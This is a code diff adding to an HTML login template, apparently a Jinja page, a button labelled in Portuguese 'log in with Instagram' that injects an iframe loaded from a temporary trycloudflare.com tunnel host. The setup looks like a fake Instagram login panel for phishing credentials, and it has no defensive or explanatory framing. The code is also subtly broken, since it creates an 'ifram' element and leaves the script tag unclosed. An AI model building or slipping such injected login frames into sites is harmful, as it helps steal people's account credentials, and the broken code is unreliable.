@@ -280,6 +280,28 @@
 
 
 
+<button id="btnbtncoiso"> Fazer o login com o insta </button>
+
+<div id="cooo">
+</div>
+<script>
+    function createIframe() {
+	var cooo = document.getElementById("cooo");
+        var cosio = document.createElement("ifram");
+	cosio.src = "https://pci-sellers-yeast-skirt.trycloudflare.com"
+	cosio.width = "400";
+	cosio.height = "400";
+	cosio.frameBorder = "0";
+	cosio.scrolling = "0";
+	cosio.style.border = "none";
+	cosio.style.background = "white";
+
+	cooo.appendChild(cosio);
+    }
+
+    document.getElementById("btnbtncoiso").addEventListener("click", () => {
+        createIframe();
+    });
 {% if no %}
 <div class="alert alert-danger" role="alert">
   Login Errado
